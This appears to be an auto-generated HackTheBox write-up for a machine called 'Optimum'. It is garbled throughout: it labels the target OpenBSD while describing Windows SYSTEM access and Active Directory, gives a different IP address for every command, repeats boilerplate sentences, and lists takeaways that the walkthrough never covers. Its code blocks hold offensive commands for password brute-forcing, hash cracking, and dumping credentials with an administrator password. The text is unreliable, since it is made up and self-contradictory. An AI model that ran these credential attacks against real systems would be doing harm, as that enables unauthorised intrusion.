---
TitleSEO: "HackTheBox — Optimum (Medium OpenBSD) | ZureFX"
TitlePost: "HackTheBox — Optimum (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Optimum. Subdomain Takeover and AS-REP Roasting to achieve medium compromise on OpenBSD."
Keywords: "medium, hackthebox, web, reversing, linux, tryhackme"
URL: "https://zurefx.github.io/writeups/htb-optimum-783.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-optimum-783/"
Date: "2024-05-14"
Tags: "Medium, HackTheBox, Web, Reversing, Linux, TryHackMe"
Section: "writeups"
Lang: "en"
main_img: "htb-optimum-783"
Permalink: "/writeups/htb-optimum-783.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Optimum** is rated **Medium** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.118.213.196`.

### Objectives

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.79.52.144/FUZZ
evil-winrm -i 10.81.202.190 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.87.154.108 -u administrator -p 'P@ssw0rd!' --shares
```

The database credentials were hardcoded in the application source code. Weak file permissions allowed modification of critical system files.

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.18.145.25/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.111.167.215 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials.

### Web Enumeration

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
crackmapexec smb 10.25.42.92 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p5986,5985,135 10.57.204.84 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.29.113.39/FUZZ
```

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

Key finding: **AS-REP Roasting**.

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

### Initial Access

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
evil-winrm -i 10.51.32.50 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.14.152.20
```

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

```powershell
nmap -sCV -p3268,110,25 10.46.147.110 -oN scan.txt
nmap -sCV -p443,5985,445 10.14.25.171 -oN scan.txt
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.84.83 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p139,9200,3268 10.115.182.212 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `crackmapexec`
- `hydra`
- `wpscan`
- `ldapsearch`
- `msfvenom`
- `sqlmap`
- `impacket`
- `smbexec`

### Key Takeaways

- Subdomain Takeover
- AS-REP Roasting
- NTLM Relay
- SUID Binary
